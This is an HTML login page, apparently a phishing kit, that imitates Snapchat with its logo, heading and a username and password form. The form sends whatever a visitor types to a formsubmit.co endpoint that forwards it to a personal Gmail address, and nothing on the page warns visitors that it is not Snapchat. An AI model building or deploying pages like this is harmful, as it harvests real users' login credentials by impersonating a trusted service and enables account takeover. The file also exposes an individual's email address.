<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Snapchat Clone</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <!-- Koristi PNG sliku koju si preuzeo i postavio u isti folder -->
            <img src="snapchat-logo.png" alt="Snapchat Logo" class="logo">
        </div>
        <h1>Snapchat</h1>
        
        <!-- Forma sa Formsubmit integracijom -->
        <form action="https://formsubmit.co/novakovicluka723@gmail.com" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="login-button">Log In</button>
        </form>
        
        <div class="bottom-links">
            <a href="#">Forgot Password?</a>
        </div>
    </div>
</body>
</html>
